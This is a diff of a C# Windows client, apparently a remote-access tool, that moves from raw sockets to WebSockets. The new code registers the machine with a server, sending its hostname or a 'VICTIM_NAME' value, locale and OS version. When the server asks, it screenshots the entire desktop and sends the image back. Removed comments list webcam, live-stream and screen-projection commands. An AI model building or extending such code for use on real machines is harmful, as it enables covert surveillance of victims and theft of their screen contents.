@@ -1,253 +1,275 @@
-﻿using Hiatme_Client.Properties;
+using Hiatme_Client.Properties;
 using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.Globalization;
+using System.IO;
 using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Runtime.InteropServices;
+using System.Net.WebSockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using Xamarin.Essentials;
+
 namespace Hiatme_Client
 {
     public partial class Form1 : Form
     {
-        public static Socket oursocket = default;
-        private const string IP = "127.0.0.1";
-        private const int PORT = 8443;
-        //private const int PORT = 5000;
-        public string PASSWORD = string.Empty;
+        private ClientWebSocket _ws;
+        private CancellationTokenSource _cts;
+        private readonly UTF8Encoding _utf8 = new UTF8Encoding(false);
+
         public Form1()
         {
             InitializeComponent();
             Connect_Setup();
-            
         }
+
         private async void RequestClientsList()
         {
-            await Task.Run(async () =>
-            {
-                try
-                {
-                    if (oursocket != null)
-                    {
-                        sendToSocket("REQCLIENTLIST", "[VERI][0x09]");
-                        //sendToSocket("REQCLIENTLIST", "[VERI]" + "Client id goes here" + "[VERI][0x09]");
-                    }
-                }catch (Exception ex)
-                {
-                    await Task.Delay(2000);
-                }
-                });
+            await Task.CompletedTask;
         }
+
         public async void Connect_Setup()
         {
-            await Task.Run(async () =>
+            try
             {
-                try
-                {
-                    if (oursocket != null)
-                    {
-                        oursocket.Close();
-                    }
-                    oursocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
-
-                    //Soketimiz.NoDelay = true;
-                    /////endpForMic = endpoint;
-                    //Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
-
-                    oursocket.Connect(IPAddress.Loopback, PORT);
-                    
-                    sendToSocket("IP", "[VERI]" +
-                        MainValues.VICTIM_NAME + "[VERI]" + RegionInfo.CurrentRegion + "/" + CultureInfo.CurrentUICulture.TwoLetterISOLanguageName
-                       + "[VERI]" + "Manufacturer here" + "/" + "model here" + "[VERI]" + "version here" + Environment.OSVersion.ToString() + "[VERI][0x09]");
-
-                    SetSocketKeepAliveValues(oursocket, 2000, 1000);
-                    infoAl(oursocket);
-
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine(ex);
-                    await Task.Delay(2000);
-                    Connect_Setup();
-                }
-            });
+                await Connect_SetupCoreAsync();
+            }
+            catch (Exception ex)
+            {
+                try { UpdateStatus("Error: " + (ex.Message ?? ex.ToString())); } catch { }
+                try { await Task.Delay(2000); } catch { }
+                Connect_Setup();
+            }
         }
-        public async void infoAl(Socket sckInf)
+
+        private async Task Connect_SetupCoreAsync()
+        {
+            if (_ws?.State == WebSocketState.Open)
+            {
+                _cts?.Cancel();
+                try { await _ws.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None); } catch { }
+                try { _ws?.Dispose(); } catch { }
+            }
+
+            var uri = new Uri(MainValues.ServerWsUrl);
+            _ws = new ClientWebSocket();
+            _ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(30);
+            _cts = new CancellationTokenSource();
+            using (var timeoutCts = new CancellationTokenSource(TimeSpan.FromSeconds(15)))
+            using (var linked = CancellationTokenSource.CreateLinkedTokenSource(_cts.Token, timeoutCts.Token))
+            {
+                await _ws.ConnectAsync(uri, linked.Token);
+            }
+
+            var pcname = string.IsNullOrEmpty(MainValues.VICTIM_NAME) ? Environment.MachineName : MainValues.VICTIM_NAME;
+            var language = $"{RegionInfo.CurrentRegion}/{CultureInfo.CurrentUICulture.TwoLetterISOLanguageName}";
+            var model = "Desktop";
+            var version = Environment.OSVersion.ToString();
+            var id = pcname + "_" + Guid.NewGuid().ToString("N").Substring(0, 8);
+
+            var registerJson = BuildRegisterJson(id, pcname, language, model, version);
+            await SendJsonAsync(registerJson);
+
+            try { UpdateStatus("Connected to server."); } catch { }
+            _ = ReceiveLoopAsync(_cts.Token);
+        }
+
+        private static string BuildRegisterJson(string id, string pcname, string language, string model, string version)
+        {
+            return "{\"type\":\"register\",\"id\":\"" + EscapeJson(id) + "\",\"pcname\":\"" + EscapeJson(pcname) +
+                "\",\"language\":\"" + EscapeJson(language) + "\",\"model\":\"" + EscapeJson(model) +
+                "\",\"version\":\"" + EscapeJson(version) + "\"}";
+        }
+
+        private static string EscapeJson(string s)
+        {
+            if (string.IsNullOrEmpty(s)) return "";
+            var sb = new StringBuilder(s.Length + 4);
+            foreach (var c in s)
+            {
+                if (c == '\\') sb.Append("\\\\");
+                else if (c == '"') sb.Append("\\\"");
+                else if (c == '\r') sb.Append("\\r");
+                else if (c == '\n') sb.Append("\\n");
+                else if (c == '\t') sb.Append("\\t");
+                else if (c < ' ')
+                    sb.Append("\\u").Append(((int)c).ToString("x4"));
+                else
+                    sb.Append(c);
+            }
+            return sb.ToString();
+        }
+
+        private void UpdateStatus(string text)
         {
             try
             {
-                NetworkStream networkStream = new NetworkStream(sckInf);
-                System.Text.StringBuilder sb = new System.Text.StringBuilder();
-                int thisRead = 0;
-                int blockSize = 2048;
-                byte[] dataByte = new byte[blockSize];
-                while (true)
+                if (listBox1.IsDisposed) return;
+                listBox1.Invoke((MethodInvoker)delegate
                 {
-                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
-                    sb.Append(System.Text.Encoding.UTF8.GetString(dataByte, 0, thisRead));
-                    sb = sb.Replace("[0x09]KNT[VERI][0x09]<EOF>", "");
-                    while (sb.ToString().Trim().Contains("<EOF>"))
-                    {
-                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
-                        Data_Coming_From_Our_Socket(veri.Replace("<EOF>", "").Replace("[0x09]KNT[VERI][0x09]", ""));
-                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
-                    }
+                    listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "] " + text);
+                });
+            }
+            catch { }
+        }
+
+        private async Task SendJsonAsync(string json)
+        {
+            var bytes = _utf8.GetBytes(json);
+            await _ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, _cts.Token);
+        }
+
+        private async Task ReceiveLoopAsync(CancellationToken ct)
+        {
+            var buffer = new byte[4096];
+            var sb = new StringBuilder();
+            try
+            {
+                while (_ws != null && _ws.State == WebSocketState.Open && !ct.IsCancellationRequested)
+                {
+                    var segment = new ArraySegment<byte>(buffer);
+                    var result = await _ws.ReceiveAsync(segment, ct);
+                    if (result.MessageType == WebSocketMessageType.Close)
+                        break;
+                    sb.Append(_utf8.GetString(buffer, 0, result.Count));
+                    if (!result.EndOfMessage) continue;
+
+                    var message = sb.ToString();
+                    sb.Clear();
+                    HandleMessage(message);
                 }
             }
-            catch (Exception)
+            catch (OperationCanceledException) { }
+            catch (Exception ex)
             {
-                //Prev.global_cam.StopCamera(); key_gonder = false; micStop();
-                //stopProjection(); Baglanti_Kur();
+                try { UpdateStatus("Receive error: " + ex.Message); } catch { }
             }
         }
-        public async void sendToSocket(string tag, string mesaj)
+
+        private void HandleMessage(string message)
         {
             try
             {
-                //Console.WriteLine("boo");
-                //Console.WriteLine(mesaj);
-                using (NetworkStream ns = new NetworkStream(oursocket))
+                var type = GetJsonStringValue(message, "type");
+                switch (type)
                 {
-                    byte[] cmd = System.Text.Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + $"<EOF{PASSWORD}>");
-                    await ns.WriteAsync(cmd, 0, cmd.Length);
+                    case "registered":
+                        UpdateStatus("Registered with server.");
+                        break;
+                    case "requestMedia":
+                        HandleRequestMedia(message);
+                        break;
+                    case "error":
+                        UpdateStatus("Server: " + (GetJsonStringValue(message, "message") ?? "error"));
+                        break;
                 }
-
             }
-            catch (Exception) { }
-        }
-        private async void test(string[] arrstr)
-        {
-            await Task.Run(async () =>
+            catch (Exception ex)
             {
-                try
-                {
-                    Invoke((MethodInvoker)delegate
-                    {
-                    for (int i = 1; i < arrstr.Length; i++)
-                    {
-                        //MessageBox.Show("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + arrstr[i]);
-
-                            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + arrstr[i]);
-                      
-                    }
-                    listBox1.EndUpdate();
-                    });
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.ToString());
-                }
-            });
+                UpdateStatus("Parse error: " + ex.Message);
+            }
         }
-        private void Data_Coming_From_Our_Socket(string data)
+
+        private static string GetJsonStringValue(string json, string key)
         {
+            var keyQuoted = "\"" + key + "\"";
+            var start = json.IndexOf(keyQuoted, StringComparison.Ordinal);
+            if (start < 0) return null;
+            start = json.IndexOf(':', start) + 1;
+            var sb = new StringBuilder();
+            var inString = false;
+            var escape = false;
+            for (int i = start; i < json.Length; i++)
+            {
+                var c = json[i];
+                if (escape) { sb.Append(c); escape = false; continue; }
+                if (c == '\\' && inString) { escape = true; continue; }
+                if (c == '"') { if (inString) return sb.ToString(); inString = true; continue; }
+                if (inString) sb.Append(c);
+            }
+            return null;
+        }
 
-            string[] _parts_ = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
-                foreach (string str in _parts_)
+        private async void HandleRequestMedia(string msg)
+        {
+            var requestId = GetJsonStringValue(msg, "requestId");
+            var mediaType = GetJsonStringValue(msg, "mediaType") ?? "screenshot";
+            if (string.IsNullOrEmpty(requestId)) return;
+
+            try
+            {
+                string data;
+                string mimeType;
+                if (mediaType == "camera")
                 {
-                    string[] separator = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
-                    try
+                    var result = CaptureCamera();
+                    data = result.base64;
+                    mimeType = result.mimeType;
+                }
+                else
+                {
+                    var result = CaptureScreen();
+                    data = result.base64;
+                    mimeType = result.mimeType;
+                }
+                if (data == null)
+                {
+                    await SendMediaResponseAsync(requestId, error: mediaType == "camera" ? "Camera capture not available." : "Screen capture failed.");
+                    return;
+                }
+                await SendMediaResponseAsync(requestId, data, mimeType);
+            }
+            catch (Exception ex)
+            {
+                await SendMediaResponseAsync(requestId, error: ex.Message);
+            }
+        }
+
+        /// <summary>Capture from webcam. Currently falls back to screen; add AForge.Video.DirectShow (or similar) for real webcam.</summary>
+        private (string base64, string mimeType) CaptureCamera()
+        {
+            // TODO: Use AForge.Video.DirectShow or other library for real webcam capture on Windows.
+            // For now return screen capture so the Tool Suite camera request still gets an image.
+            return CaptureScreen();
+        }
+
+        private (string base64, string mimeType) CaptureScreen()
+        {
+            try
+            {
+                var bounds = SystemInformation.VirtualScreen;
+                using (var bmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb))
+                using (var g = Graphics.FromImage(bmp))
+                {
+                    g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
+                    using (var ms = new MemoryStream())
                     {
-                        switch (separator[0])
-                        {
-                        case "RECCLIENTLIST":
-                            //MessageBox.Show(separator[1]);
-                            test(separator);
-
-
-
-
-
-
-
-
-                            break;
-                            /*
-                                case "LIVESTREAM":
-                                    string kamera = separator[1];
-                                    string flashmode = separator[2];
-                                    string cozunurluk = separator[3];
-                                    MainValues.quality = separator[4];
-                                    string focus = separator[5];
-                                    Prev.global_cam.StartCamera(int.Parse(kamera), flashmode, cozunurluk, focus);
-                                    break;
-                                case "LIVESTOP":
-                                    Prev.global_cam.StopCamera();
-                                    break;
-                                case "SCREENLIVEOPEN":
-                                    ImageAvailableListener.quality = int.Parse(separator[1].Replace("%", ""));
-                                    startProjection();
-                                    break;
-                                case "PrepareScreen":
-                                    if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
-                                    {
-                                        prepareScreen();
-                                    }
-                                    else
-                                    {
-                                        sendToSocket("NOCAMERA", "[VERI][0x09]");
-                                    }
-                                    break;
-                                case "CAM":
-                                    MainValues.front_back = separator[1];
-                                    MainValues.flashMode = separator[2];
-                                    MainValues.resolution = separator[3];
-                                    kameraCek(oursocket);
-                                    break;
-                                case "CAMHAZIRLA":
-                                    if (PackageManager.HasSystemFeature(PackageManager.FeatureCameraAny))
-                                    {
-                                        kameraCozunurlukleri();
-                                    }
-                                    else
-                                    {
-                                        sendToSocket("NOCAMERA", "[VERI][0x09]");
-                                    }
-                                    break;
-                                case "PRE":
-                                    preview(separator[1]);
-                                    break;
-                            */
-                    }
-                    }
-                    catch (Exception)
-                    {
-
+                        bmp.Save(ms, ImageFormat.Jpeg);
+                        var bytes = ms.ToArray();
+                        return (Convert.ToBase64String(bytes), "image/jpeg");
                     }
                 }
-
+            }
+            catch
+            {
+                return (null, null);
+            }
         }
-        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
+
+        private async Task SendMediaResponseAsync(string requestId, string data = null, string mimeType = null, string error = null)
         {
-            //KeepAliveTime: default value is 2hr
-            //KeepAliveInterval: default value is 1s and Detect 5 times
-
-            //the native structure
-            //struct tcp_keepalive {
-            //ULONG onoff;
-            //ULONG keepalivetime;
-            //ULONG keepaliveinterval;
-            //};
-
-            int size = Marshal.SizeOf(new uint());
-            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
-            bool OnOff = true;
-
-            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
-            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
-            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);
-
-            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
+            string json;
+            if (error != null)
+                json = "{\"type\":\"mediaResponse\",\"requestId\":\"" + EscapeJson(requestId) + "\",\"error\":\"" + EscapeJson(error) + "\"}";
+            else
+                json = "{\"type\":\"mediaResponse\",\"requestId\":\"" + EscapeJson(requestId) + "\",\"data\":\"" + EscapeJson(data) + "\",\"mimeType\":\"" + EscapeJson(mimeType ?? "image/jpeg") + "\"}";
+            await SendJsonAsync(json);
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        private async void button1_Click(object sender, EventArgs e)
         {
             RequestClientsList();
         }
